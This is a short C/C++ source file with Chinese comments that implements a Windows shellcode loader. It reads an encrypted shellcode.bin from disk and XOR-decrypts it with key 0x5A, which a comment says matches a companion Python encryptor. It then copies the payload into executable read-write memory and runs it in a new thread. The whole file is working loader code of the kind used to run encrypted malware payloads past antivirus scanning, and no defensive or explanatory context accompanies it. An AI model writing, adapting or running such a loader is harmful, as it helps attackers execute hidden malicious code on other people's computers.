#include <windows.h>
#include <stdio.h>

// XOR解密函数（与Python脚本保持一致）
void XORDecrypt(BYTE* data, size_t size, BYTE key = 0x5A) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

// 从文件读取Shellcode
BYTE* ReadShellcode(LPCSTR filename, size_t* pSize) {
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    *pSize = GetFileSize(hFile, NULL);
    BYTE* pData = (BYTE*)VirtualAlloc(NULL, *pSize, MEM_COMMIT, PAGE_READWRITE);
    
    DWORD bytesRead;
    ReadFile(hFile, pData, *pSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    return (*pSize == bytesRead) ? pData : NULL;
}

// 内存执行Shellcode
void ExecuteShellcode(BYTE* pDecrypted, size_t size) {
    // 1. 申请可执行内存
    LPVOID pExec = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // 2. 复制解密后的Shellcode
    memcpy(pExec, pDecrypted, size);
    
    // 3. 执行（创建新线程）
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExec, NULL, 0, NULL);
    if (hThread) WaitForSingleObject(hThread, INFINITE);
}

int main() {
    // 1. 自动加载当前目录下的shellcode.bin
    size_t size = 0;
    BYTE* pEncrypted = ReadShellcode("shellcode.bin", &size);
    if (!pEncrypted || size == 0) {
        MessageBoxA(NULL, "Failed to read shellcode.bin", "Error", MB_ICONERROR);
        return 1;
    }

    // 2. XOR解密（密钥0x5A需与Python脚本一致）
    XORDecrypt(pEncrypted, size);

    // 3. 执行Shellcode
    ExecuteShellcode(pEncrypted, size);

    // 4. 清理
    VirtualFree(pEncrypted, 0, MEM_RELEASE);
    return 0;
}